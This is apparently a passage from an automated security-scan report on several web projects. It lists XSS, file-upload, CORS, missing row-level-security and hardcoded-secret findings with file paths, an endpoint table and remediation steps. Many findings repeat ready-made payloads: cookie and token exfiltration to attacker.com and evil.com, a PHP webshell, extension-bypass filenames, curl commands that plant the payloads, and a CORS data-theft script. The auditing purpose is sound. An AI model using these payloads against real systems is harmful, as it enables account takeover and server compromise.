Unsanitized HTML rendered at `Gainx/school-dashboard/js/calendar.js:21`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/school-dashboard/js/calendar.js:21
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Gainx/school-dashboard/js/calendar.js:57`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Gainx/school-dashboard/js/calendar.js:57`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Gainx/school-dashboard/js/calendar.js:57
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S033] File upload without type validation
**Type:** Malicious File Upload → RCE / Stored XSS  
**Severity:** 🟠 HIGH  
**Location:** `lib/actions/file-actions.ts:42`  
**Privilege Gain:** `user → server_rce`

Upload handler at `lib/actions/file-actions.ts:42` lacks MIME type and extension validation. Attacker uploads a PHP webshell disguised as `image.jpg`. If files are served from web root → direct RCE via browser. SVG uploads enable stored XSS for all viewers. ZIP/tar → zip-slip path traversal.

**Payload:**
```
# PHP webshell as image.jpg:
<?php system($_GET['cmd']); ?>

# SVG with stored XSS:
<svg xmlns='http://www.w3.org/2000/svg'>
  <script>fetch('https://evil.com/?c='+document.cookie)</script>
</svg>

# Double extension bypass:
shell.php.jpg  /  shell.php%00.jpg
```

**Example:**
```bash
# No MIME/extension check at lib/actions/file-actions.ts:42
curl -X POST /api/upload \
  -F 'file=@shell.php;type=image/jpeg'
# Then execute: curl https://target.com/uploads/shell.php?cmd=id
```

**Impact:** RCE if served directly, stored XSS for SVG, zip-slip for archives

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Portifolio/script.js:277`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Portifolio/script.js:277`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Portifolio/script.js:277
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Portifolio/script.js:318`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Portifolio/script.js:318`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Portifolio/script.js:318
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Portifolio/script.js:322`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Portifolio/script.js:322`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Portifolio/script.js:322
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Portifolio/script.js:405`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Portifolio/script.js:405`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Portifolio/script.js:405
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Portifolio/script.js:414`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Portifolio/script.js:414`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Portifolio/script.js:414
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

### [S013] innerHTML assignment
**Type:** Cross-Site Scripting (XSS)  
**Severity:** 🟠 HIGH  
**Location:** `Portifolio/script.js:424`  
**Privilege Gain:** `attacker → victim_session`

Unsanitized HTML rendered at `Portifolio/script.js:424`. Attacker stores XSS payload via any user input feeding this render. When victim views page: cookies, localStorage tokens, DOM content exfiltrated silently. Session token replay → complete account takeover. Admin viewing page: full admin takeover.

**Payload:**
```
<img src=x onerror=fetch(`https://attacker.com/?c=${document.cookie}`)>
<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
<svg onload=document.location='https://evil.com/?s='+localStorage.getItem('authToken')>
<iframe srcdoc='<script>parent.postMessage(document.cookie,"*")</script>'>
```

**Example:**
```bash
# Unsanitized render at Portifolio/script.js:424
# 1. Store payload via POST /api/comment (or any user input)
# 2. Any user viewing the page triggers exfil to attacker.com
curl -X POST /api/comment -d 'text=<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
```

**Impact:** Session hijacking, account takeover for every user viewing the page

---

## Additional Deep Scan Findings

> SSRF, CORS, NoSQLi, XXE, weak PRNG, rate limits — not in base scan.

### [D004] CORS Misconfiguration — Any Origin Allowed
**Severity:** 🟠 HIGH  
**Location:** `DMDI/webshop/tests/env.test.ts:54`  
**Description:** Wildcard or reflected CORS origin allows any site to make credentialed cross-origin requests.

**Payload:**
```
// evil.com — steals data from logged-in users:
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  new Image().src = 'https://attacker.com/steal?d=' + JSON.stringify(data)
})
```

**Impact:** Any origin reads full authenticated API responses — complete data exfil from all logged-in users

**Context:**
```
expect(() => parseEnv({ ...validEnv, CORS_ORIGIN: "*" })).toThrow();
```

---

## Discovered Endpoints

| Method | Path | File | Auth? | Framework |
|--------|------|------|-------|-----------|
| `GET` | `/` | `Whatsbot/src/routes/webhook.js:67` | ✗ | express |
| `POST` | `/` | `Whatsbot/src/routes/webhook.js:79` | ✗ | express |
| `GET` | `/:id` | `DMDI/webshop/src/routes/orders.routes.ts:25` | ✓ | express |
| `GET` | `/announcements` | `InfoLora/src/index.ts:60` | ✗ | express |
| `POST` | `/announcements` | `InfoLora/src/index.ts:50` | ✗ | express |
| `GET` | `/api/announcements` | `Memory/InfoLora/src/server.js:39` | ✗ | express |
| `POST` | `/api/announcements` | `Memory/InfoLora/src/server.js:49` | ✗ | express |
| `DELETE` | `/api/imoveis/bulk` | `app/api/imoveis/bulk/route.ts:6` | ✓ | nextjs-app |
| `GET` | `/api/investors` | `app/api/investors/route.ts:6` | ✓ | nextjs-app |
| `POST` | `/api/investors` | `app/api/investors/route.ts:21` | ✓ | nextjs-app |
| `DELETE` | `/api/investors/:id` | `app/api/investors/[id]/route.ts:45` | ✓ | nextjs-app |
| `GET` | `/api/investors/:id` | `app/api/investors/[id]/route.ts:10` | ✓ | nextjs-app |
| `PATCH` | `/api/investors/:id` | `app/api/investors/[id]/route.ts:27` | ✓ | nextjs-app |
| `GET` | `/api/investors/:id/matches` | `app/api/investors/[id]/matches/route.ts:10` | ✓ | nextjs-app |
| `POST` | `/api/listings/:id/enrich-location` | `app/api/listings/[id]/enrich-location/route.ts:9` | ✓ | nextjs-app |
| `GET` | `/api/listings/:id/location-insight` | `app/api/listings/[id]/location-insight/route.ts:9` | ✓ | nextjs-app |
| `GET` | `/api/listings/:id/score` | `app/api/listings/[id]/score/route.ts:10` | ✓ | nextjs-app |
| `POST` | `/api/listings/:id/score` | `app/api/listings/[id]/score/route.ts:23` | ✓ | nextjs-app |
| `POST` | `/api/location-insights` | `app/api/location-insights/route.ts:9` | ✓ | nextjs-app |
| `GET` | `/api/location-insights/:id` | `app/api/location-insights/[id]/route.ts:9` | ✓ | nextjs-app |
| `GET` | `/api/proxy-image` | `app/api/proxy-image/route.ts:6` | ✗ | nextjs-app |
| `GET` | `/api/temperatures` | `Memory/InfoLora/src/server.js:9` | ✗ | express |
| `POST` | `/api/temperatures/webhook` | `Memory/InfoLora/src/server.js:22` | ✗ | express |
| `GET` | `/api/track/:token` | `app/api/track/[token]/route.ts:21` | ✗ | nextjs-app |
| `GET` | `/bad-request` | `DMDI/webshop/tests/app.test.ts:129` | ✗ | express |
| `GET` | `/boom` | `DMDI/webshop/tests/app.test.ts:111` | ✗ | express |
| `GET` | `/clients` | `DMDI/webshop/src/routes/admin.routes.ts:30` | ✓ | express |
| `POST` | `/clients` | `DMDI/webshop/src/routes/admin.routes.ts:29` | ✓ | express |
| `DELETE` | `/clients/:id` | `DMDI/webshop/src/routes/admin.routes.ts:48` | ✗ | express |
| `GET` | `/clients/pending` | `DMDI/webshop/src/routes/admin.routes.ts:31` | ✓ | express |
| `GET` | `/db` | `DMDI/webshop/tests/app.test.ts:147` | ✗ | express |
| `GET` | `/health` | `Whatsbot/src/app.js:9` | ✗ | express |
| `GET` | `/js/env.js` | `DMDI/webshop/src/app.ts:38` | ✗ | express |
| `POST` | `/login` | `DMDI/webshop/src/routes/auth.routes.ts:18` | ✓ | express |
| `GET` | `/logo.png` | `DMDI/webshop/src/app.ts:43` | ✗ | express |
| `GET` | `/logo.svg` | `DMDI/webshop/src/app.ts:46` | ✗ | express |
| `GET` | `/me` | `DMDI/webshop/src/routes/auth.routes.ts:25` | ✓ | express |
| `GET` | `/orders` | `DMDI/webshop/src/routes/admin.routes.ts:32` | ✓ | express |
| `POST` | `/password-reset/request` | `DMDI/webshop/src/routes/auth.routes.ts:19` | ✓ | express |
| `POST` | `/register` | `DMDI/webshop/src/routes/auth.routes.ts:17` | ✓ | express |
| `GET` | `/stream` | `InfoLora/src/index.ts:80` | ✗ | express |
| `GET` | `/temperatures` `[roomId]` | `InfoLora/src/index.ts:39` | ✗ | express |
| `GET` | `/temperatures/:roomId` `[roomId]` | `InfoLora/src/index.ts:44` | ✗ | express |
| `POST` | `/twilio` | `Whatsbot/src/routes/webhook.js:93` | ✗ | express |
| `POST` | `/webhooks/ttn` | `InfoLora/src/index.ts:65` | ✗ | express |
| `GET` | `trust proxy` | `DMDI/webshop/tests/app.test.ts:51` | ✗ | express |

---

## Base Scan Findings

#### 🔴 CRITICAL

- **[S018]** Supabase getSession() on server — `BuildLog/src/contexts/AuthContext.jsx:11`
- **[S039]** RLS not enabled on table "User" — `DMDI/webshop/prisma/migrations/20260520085258_init/migration.sql`
- **[S039]** RLS not enabled on table "Product" — `DMDI/webshop/prisma/migrations/20260520085258_init/migration.sql`
- **[S039]** RLS not enabled on table "Order" — `DMDI/webshop/prisma/migrations/20260520085258_init/migration.sql`
- **[S039]** RLS not enabled on table "OrderItem" — `DMDI/webshop/prisma/migrations/20260520085258_init/migration.sql`
- **[S039]** RLS not enabled on table "PasswordResetToken" — `DMDI/webshop/prisma/migrations/20260521093000_password_reset_tokens/migration.sql`
- **[S003f]** Hardcoded password — `DMDI/webshop/prisma/seed-demo-users.ts:13`
- **[S003f]** Hardcoded password — `DMDI/webshop/public/js/mock/users.js:17`
- **[S003f]** Hardcoded password — `DMDI/webshop/public/js/mock/users.js:25`
- **[S003f]** Hardcoded password — `DMDI/webshop/public/js/mock/users.js:34`
- **[S003f]** Hardcoded password — `DMDI/webshop/tests/auth.test.ts:66`
- **[S003f]** Hardcoded password — `DMDI/webshop/tests/auth.test.ts:83`
- **[S003f]** Hardcoded password — `DMDI/webshop/tests/auth.test.ts:101`
- **[S003f]** Hardcoded password — `DMDI/webshop/tests/auth.test.ts:110`
- **[S003f]** Hardcoded password — `DMDI/webshop/tests/auth.test.ts:116`
- **[S003f]** Hardcoded password — `DMDI/webshop/tests/auth.test.ts:226`
- **[S003f]** Hardcoded password — `DMDI/webshop/tests/auth.test.ts:269`
- **[S039]** RLS not enabled on table stops — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table routes — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table stop_routes — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table trips — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table stop_times — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table arrivals_cache — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table user_trips — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table favorite_stops — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table credit_balance — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table credit_transactions — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table _schema_version — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table sync_status — `Pombus/pombus/lib/infrastructure/database/schema.sql`
- **[S039]** RLS not enabled on table deals — `RealTools/supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table buyers — `RealTools/supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table deal_buyers — `RealTools/supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table notes — `RealTools/supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table activities — `RealTools/supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table deal_files — `RealTools/supabase/migrations/001_initial_schema.sql`
- **[S003f]** Hardcoded password — `RealTools/tests/fixtures/score-card-e2e.ts:28`
- **[S039]** RLS not enabled on table contacts — `Whatsbot/src/db/schema.sql`
- **[S039]** RLS not enabled on table conversations — `Whatsbot/src/db/schema.sql`
- **[S039]** RLS not enabled on table bookings — `Whatsbot/src/db/schema.sql`
- **[S039]** RLS not enabled on table messages — `Whatsbot/src/db/schema.sql`
- **[S039]** RLS not enabled on table `avaliacoes` — `loja/loja_informatica.sql`
- **[S039]** RLS not enabled on table `categorias` — `loja/loja_informatica.sql`
- **[S039]** RLS not enabled on table `contactos` — `loja/loja_informatica.sql`
- **[S039]** RLS not enabled on table `encomendas` — `loja/loja_informatica.sql`
- **[S039]** RLS not enabled on table `itens_encomenda` — `loja/loja_informatica.sql`
- **[S039]** RLS not enabled on table `pagamentos` — `loja/loja_informatica.sql`
- **[S039]** RLS not enabled on table `produtos` — `loja/loja_informatica.sql`
- **[S039]** RLS not enabled on table `utilizadores` — `loja/loja_informatica.sql`
- **[S018]** Supabase getSession() on server — `realtools-cli/src/client.ts:58`
- **[S039]** RLS not enabled on table deals — `supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table buyers — `supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table deal_buyers — `supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table notes — `supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table activities — `supabase/migrations/001_initial_schema.sql`
- **[S039]** RLS not enabled on table deal_files — `supabase/migrations/001_initial_schema.sql`
- **[S003f]** Hardcoded password — `tests/fixtures/score-card-e2e.ts:28`

#### 🟠 HIGH

- **[S013]** innerHTML assignment — `DMDI/webshop/public/js/utils/html.js:11`
- **[S003g]** Hardcoded secret/token — `DMDI/webshop/tests/app.test.ts:14`
- **[S003g]** Hardcoded secret/token — `DMDI/webshop/tests/auth.test.ts:10`
- **[S003g]** Hardcoded secret/token — `DMDI/webshop/tests/env.test.ts:10`
- **[S003g]** Hardcoded secret/token — `DMDI/webshop/tests/env.test.ts:39`
- **[S003g]** Hardcoded secret/token — `DMDI/webshop/tests/phase1-smoke.test.ts:12`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/animations.js:302`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/animations.js:398`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/main.js:290`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/products.js:152`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/products.js:182`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/products.js:265`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/products.js:282`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/products.js:369`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/products.js:417`
- **[S013]** innerHTML assignment — `Gainx/makita-store/js/products.js:420`
- **[S013]** innerHTML assignment — `Gainx/school-dashboard/js/calendar.js:21`
- **[S013]** innerHTML assignment — `Gainx/school-dashboard/js/calendar.js:57`
- **[S013]** innerHTML assignment — `Gainx/school-dashboard/js/main.js:75`
- **[S013]** innerHTML assignment — `Gainx/school-dashboard/js/main.js:114`
- **[S013]** innerHTML assignment — `Gainx/school-dashboard/js/main.js:157`
- **[S013]** innerHTML assignment — `Gainx/school-dashboard/js/sensors.js:38`
- **[S013]** innerHTML assignment — `Gainx/school-dashboard/js/sensors.js:52`
- **[S013]** innerHTML assignment — `Portifolio/script.js:277`
- **[S013]** innerHTML assignment — `Portifolio/script.js:318`
- **[S013]** innerHTML assignment — `Portifolio/script.js:322`
- **[S013]** innerHTML assignment — `Portifolio/script.js:405`
- **[S013]** innerHTML assignment — `Portifolio/script.js:414`
- **[S013]** innerHTML assignment — `Portifolio/script.js:424`
- **[S033]** File upload without type validation — `RealTools/components/deals/activity-log-section.tsx:36`
- **[S033]** File upload without type validation — `RealTools/components/deals/activity-log-section.tsx:51`
- **[S033]** File upload without type validation — `RealTools/components/files/files-section.tsx:59`
- **[S033]** File upload without type validation — `RealTools/components/files/files-section.tsx:84`
- **[S033]** File upload without type validation — `RealTools/components/files/files-section.tsx:86`
- **[S033]** File upload without type validation — `RealTools/components/files/files-section.tsx:88`
- **[S033]** File upload without type validation — `RealTools/components/files/files-section.tsx:122`
- **[S033]** File upload without type validation — `RealTools/components/files/files-section.tsx:139`
- **[S033]** File upload without type validation — `RealTools/lib/actions/file-actions.ts:54`
- **[S006a]** Secret in comment — `RealTools/lib/location-intelligence/providers.js:405`
- **[S006a]** Secret in comment — `RealTools/lib/location-intelligence/providers.js:693`
- **[S019a]** Cookie possibly missing httpOnly flag — `RealTools/middleware.ts:17`
- **[S019a]** Cookie possibly missing httpOnly flag — `RealTools/middleware.ts:21`
- **[S006a]** Secret in comment — `RealTools/next.config.ts:23`
- **[S003g]** Hardcoded secret/token — `RealTools/supabase/config.toml:95`
- **[S003g]** Hardcoded secret/token — `RealTools/supabase/config.toml:287`
- **[S003g]** Hardcoded secret/token — `RealTools/supabase/config.toml:319`
- **[S003g]** Hardcoded secret/token — `RealTools/tests/location-intelligence.test.mjs:98`
- **[S003g]** Hardcoded secret/token — `Whatsbot/tests/setup-env.js:6`
- **[S003g]** Hardcoded secret/token — `Whatsbot/tests/setup-env.js:10`
- **[S033]** File upload without type validation — `components/deals/activity-log-section.tsx:36`
- **[S033]** File upload without type validation — `components/deals/activity-log-section.tsx:51`
- **[S033]** File upload without type validation — `components/files/files-section.tsx:38`
- **[S033]** File upload without type validation — `components/files/files-section.tsx:56`
- **[S033]** File upload without type validation — `components/files/files-section.tsx:58`
- **[S033]** File upload without type validation — `components/files/files-section.tsx:60`
- **[S033]** File upload without type validation — `components/files/files-section.tsx:94`
- **[S033]** File upload without type validation — `components/files/files-section.tsx:110`
- **[S033]** File upload without type validation — `lib/actions/file-actions.ts:42`
- **[S006a]** Secret in comment — `lib/location-intelligence/providers.js:405`
- **[S006a]** Secret in comment — `lib/location-intelligence/providers.js:693`
- **[S019a]** Cookie possibly missing httpOnly flag — `middleware.ts:17`
- **[S019a]** Cookie possibly missing httpOnly flag — `middleware.ts:21`
- **[S035]** npm audit: 26 vulnerabilities (0 critical, 6 high) — `package.json`
- **[S003g]** Hardcoded secret/token — `supabase/config.toml:95`
- **[S003g]** Hardcoded secret/token — `supabase/config.toml:287`
- **[S003g]** Hardcoded secret/token — `supabase/config.toml:319`
- **[S003g]** Hardcoded secret/token — `tests/location-intelligence.test.mjs:98`

#### 🟡 MEDIUM

- **[S036]** Sensitive data in console log — `DMDI/webshop/prisma/create-admin.ts:36`
- **[S036]** Sensitive data in console log — `DMDI/webshop/prisma/create-staff.ts:41`
- **[S036]** Sensitive data in console log — `DMDI/webshop/prisma/seed-demo-users.ts:9`
- **[S036]** Sensitive data in console log — `DMDI/webshop/prisma/seed-demo-users.ts:52`
- **[S036]** Sensitive data in console log — `DMDI/webshop/prisma/seed-demo-users.ts:54`

#### 🔵 LOW

- **[S001b]** .gitignore missing some secret file patterns — `.gitignore`

---

## Next Steps

1. **Investigate all CONFIRMED live findings immediately** — those are real
2. **Rotate any exposed secrets** — assume already compromised
3. **Run `secmaxxing destructive`** for auto-fixable code patterns
4. **Test LIKELY findings manually** against staging to confirm
5. **Run `secmaxxing audit`** for safe header/cookie/gitignore fixes

*Generated by secmaxxing deep — 2026-05-21 18:23*